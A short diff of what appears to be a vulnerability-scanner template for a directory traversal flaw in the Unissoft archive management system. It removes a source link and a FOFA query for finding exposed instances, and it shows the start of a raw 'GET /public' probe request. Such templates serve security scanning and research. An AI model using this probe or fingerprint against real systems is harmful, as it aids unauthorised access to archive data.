@@ -3,12 +3,8 @@ info:
   name: 紫光电子档案管理系统public存在目录遍历漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgr2y7sbe20u2beg'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wgr2y7sbe20u2beg
-    fofa: title="紫光档案管理系统" || body="紫光软件系统有限公司 Copyright©"||body="www.unissoft.com"
 http:
 - raw:
   - 'GET /public HTTP/1.1
